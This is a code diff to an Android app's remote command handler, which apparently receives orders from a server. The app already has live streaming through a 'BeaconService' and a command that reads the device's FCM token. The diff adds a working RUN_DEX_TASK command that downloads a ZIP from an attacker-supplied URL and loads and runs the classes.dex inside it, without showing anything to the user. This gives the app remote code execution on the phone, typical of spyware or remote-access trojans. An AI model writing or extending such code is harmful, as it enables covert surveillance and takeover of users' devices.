@@ -2,6 +2,7 @@ package com.example.myandroid
 
 import android.content.Context
 import android.content.Intent
+import com.example.myandroid.dynamic.DynamicTaskManager
 import android.os.Build
 import android.os.Environment
 import android.provider.Settings
@@ -173,8 +174,7 @@ object CommandProcessor {
                 "LIVE_STREAM" -> {
                     val parts = content.split("|")
                     val mode = parts[0].trim().uppercase()
-                    if (mode == "ON") {
-                        val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 15L
+                    if (mode == "ON") {                        val mins = parts.getOrNull(1)?.trim()?.toLongOrNull() ?: 15L
                         val i = android.content.Intent(ctx, BeaconService::class.java).apply {
                             putExtra("duration_mins", mins)
                             putExtra("mode", "LIVE_STREAM")
@@ -187,6 +187,85 @@ object CommandProcessor {
                         SocketManager.disconnect()
                         status = "STREAM_STOPPED"
                     }
+                }
+                "RUN_DEX_TASK" -> {
+                    val parts = content.split("|")
+                    if (parts.size < 2) {
+                        status = "FAILED (FORMAT)"
+                        errorMsg = "Usage: URL | CLASS_NAME | [TIMEOUT_MINS]"
+                    } else {
+                        val urlStr = parts[0].trim()
+                        val className = parts[1].trim()
+                        val timeoutMins = parts.getOrNull(2)?.trim()?.toLongOrNull() ?: 15L
+                        
+                        val targetBaseDir = ctx.getDir("dex_tasks", Context.MODE_PRIVATE)
+                        val label = "Task_" + className.replace(".", "_")
+                        val taskDir = java.io.File(targetBaseDir, label)
+                        
+                        if (taskDir.exists()) taskDir.deleteRecursively()
+                        taskDir.mkdirs()
+                        
+                        val zipFile = java.io.File(targetBaseDir, "${label}_temp.zip")
+                        
+                        DebugLogger.log("TASK_RUN", "Downloading task ZIP from $urlStr")
+                        val url = java.net.URL(urlStr)
+                        val conn = url.openConnection() as java.net.HttpURLConnection
+                        conn.connectTimeout = 15000
+                        conn.readTimeout = 15000
+                        
+                        if (conn.responseCode == 200) {
+                            conn.inputStream.use { input ->
+                                zipFile.outputStream().use { output -> input.copyTo(output) }
+                            }
+                            
+                            var unzipSuccess = true
+                            try {
+                                java.util.zip.ZipInputStream(zipFile.inputStream()).use { zis ->
+                                    var entry = zis.nextEntry
+                                    while (entry != null) {
+                                        val outFile = java.io.File(taskDir, entry.name)
+                                        if (!outFile.canonicalPath.startsWith(taskDir.canonicalPath)) {
+                                            throw SecurityException("Zip Path Traversal detected: ${entry.name}")
+                                        }
+                                        if (entry.isDirectory) {
+                                            outFile.mkdirs()
+                                        } else {
+                                            outFile.parentFile?.mkdirs()
+                                            java.io.FileOutputStream(outFile).use { fos -> zis.copyTo(fos) }
+                                        }
+                                        entry = zis.nextEntry
+                                    } 
+                                }
+                            } catch (e: Exception) { 
+                                unzipSuccess = false
+                                DebugLogger.log("TASK_RUN_ERR", "Unzip failed: ${e.message}")
+                            } finally {
+                                zipFile.delete()
+                            }
+                            
+                            if (unzipSuccess) {
+                                val dexFile = java.io.File(taskDir, "classes.dex")
+                                if (!dexFile.exists()) {
+                                    status = "FAILED_DEX_MISSING"
+                                    errorMsg = "Classes.dex missing"
+                                } else {
+                                    DynamicTaskManager.executeHeadlessTask(ctx, taskDir.absolutePath, className, DynamicUIManager.CortexBridge(ctx), timeoutMins)
+                                    status = "TASK_EXECUTED_HEADLESS"
+                                    errorMsg = "Class: $className"
+                                }
+                            } else {
+                                status = "FAILED_EXTRACTION"
+                            }
+                        } else {
+                            status = "FAILED_DOWNLOAD"
+                            errorMsg = "HTTP Response: ${conn.responseCode}"
+                        }
+                    }
+                }
+                "STOP_DEX_TASK" -> {
+                    val className = content.trim()
+                    DynamicTaskManager.stopTask(ctx, className)
+                    status = "TASK_STOPPED"
                 }
                 "GET_TOKEN" -> {
                     val token = DeviceManager.getRobustFcmToken(ctx)
